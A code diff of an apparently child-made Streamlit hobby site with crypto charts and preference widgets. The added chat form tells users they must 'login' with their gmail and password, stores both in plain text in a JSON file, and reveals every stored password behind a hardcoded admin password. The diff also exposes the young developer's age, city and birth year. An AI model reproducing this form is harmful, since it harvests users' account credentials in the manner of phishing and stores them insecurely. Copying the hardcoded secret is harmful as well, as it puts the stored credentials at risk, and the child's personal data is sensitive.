@@ -1,8 +1,11 @@
 import streamlit as st
 import pandas as pd
 import time
+import json
+import os
+from datetime import datetime
 
-# Прогресс-бар один раз
+st.write("In the top-left corner, click and enter your data!")
 if "progress_done" not in st.session_state:
     st.session_state.progress_done = False
     st.session_state.progress = 0
@@ -14,11 +17,11 @@ if not st.session_state.progress_done:
         time.sleep(0.02)
     st.session_state.progress_done = True
 
-# Заголовок и уведомление
+
 st.header("Welcome to Amir site!")
 st.toast("Developer: Amir")
 
-# Sidebar с вводом данных
+
 with st.sidebar:
     st.header("Enter data, please!")
     user_name = st.text_input("Your name please!", key="name")
@@ -38,7 +41,7 @@ with st.sidebar:
     st.image("https://media.tenor.com/alYCmq5y7OgAAAAM/light.gif")
     st.write("Web developer: Amir Aliyev!")
 
-# Bitcoin данные и график
+
 st.write("Bitcoin:")
 bitcoin_data = {
     "2020": [7200, 8900, 9000, 11000, 13200, 19000],
@@ -52,7 +55,7 @@ df_bitcoin = pd.DataFrame(bitcoin_data)
 st.write(df_bitcoin)
 st.line_chart(df_bitcoin)
 
-# Binance Coin данные и график
+
 st.write("Binance Coin:")
 bnb_data = {
     "2020": [13.70, 17.36, 18.50, 19.20, 20.10, 21.00, 22.30, 23.50, 24.80, 26.00, 27.50, 29.00],
@@ -66,7 +69,7 @@ df_bnb = pd.DataFrame(bnb_data)
 st.write(df_bnb)
 st.line_chart(df_bnb)
 
-# Favorite car selectbox
+
 car_option = st.selectbox(
     "What is your favorite car?", 
     ("Bmw", "Mercedes", "Audi", "Tesla", "Nissan", "Hyundai"),
@@ -74,7 +77,7 @@ car_option = st.selectbox(
 )
 st.info(f"Your favorite car is {car_option}")
 
-# Favorite programming languages multiselect
+
 languages = st.multiselect(
     "Select your favorite programming language:",
     ["Python", "C", "Javascript", "Java", "C--", "C#", "C++"],
@@ -82,11 +85,10 @@ languages = st.multiselect(
 )
 st.info(f"Your favorite programming languages: {', '.join(languages)}")
 
-# Age slider
+
 user_age = st.slider("How old are you?", 0, 99, 25, key="slider_age")
 st.write(f"You are {user_age} y.o")
 
-# Checkbox для детей
 st.write("Please choose:")
 eldest = st.checkbox("I'm the eldest child", key="eldest")
 middle = st.checkbox("I'm the middle child", key="middle")
@@ -101,10 +103,56 @@ elif youngest:
 else:
     st.write("Please, select")
 
-# Expanders с информацией о разработчике
+
 with st.expander("Developer:"):
     st.write("Developer is Amir Aliyev")
     st.image("https://images.steamusercontent.com/ugc/2046369901430585339/598952A4C009DB8F3277A60971F31667DFEFD94A/")
+
+with st.expander("Developer Data:"):
+    st.write("Amir Aliyev, live in Azerbaijan - Baku, 11 y.o")
+    st.info("Born in 2014, to become a billionaire!")
+    st.image("https://img-webcalypt.ru/img/thumb/lg/28692/20258/IWr2mmdZNIZBbR7qE34gYdXwsq72FafrH8Q7a0889AJK5ZUm9mFXXQixEhwDpZpb0RsOWXjUPdwQouUsc4RXzrYh30PsoddAHcL5o54RLlcvAI9Tx6uiQhaqaJgxbFdA.jpeg.jpg")
+
+FILE_PATH = "messages.json"
+
+if os.path.exists(FILE_PATH):
+    with open(FILE_PATH, "r", encoding="utf-8") as f:
+        all_messages = json.load(f)
+else:
+    all_messages = []
+
+with st.form("chat_form", clear_on_submit=True):
+    st.write("You must enter your details to login")
+    username = st.text_input("Your user_name:")
+    message = st.text_area("Message:")
+    gmail = st.text_input("Your gmail:")
+    password = st.text_input("Your password:")
+    submitted = st.form_submit_button("Send your message")
+
+    if submitted and username and message and password and gmail:
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        all_messages.append({
+            "user": username,
+            "message": message,
+            "password": password,
+            "time": timestamp,
+            "gmail": gmail
+        })
+        with open(FILE_PATH, "w", encoding="utf-8") as f:
+            json.dump(all_messages, f, ensure_ascii=False, indent=2)
+        st.success("Message success")
+
+owner_password = st.text_input("Admin psw - Amir psw (for secret data)", type="password")
+
+st.subheader("User Messages:")
+
+for entry in all_messages:
+    if "gmail" not in entry:
+        entry["gmail"] = gmail
+    if owner_password == "15072014amir":
+        st.markdown(f"*{entry['user']}* {entry['time']} | Message: {entry['message']} | Gmail: {entry['gmail']} | Password: {entry['password']}")
+    else:
+        st.markdown(f"*{entry['user']}* {entry['time']} | Message: {entry['message']}")
 
 with st.expander("Developer Data:"):
     st.write("Amir Aliyev, live in Azerbaijan - Baku, 11 y.o")
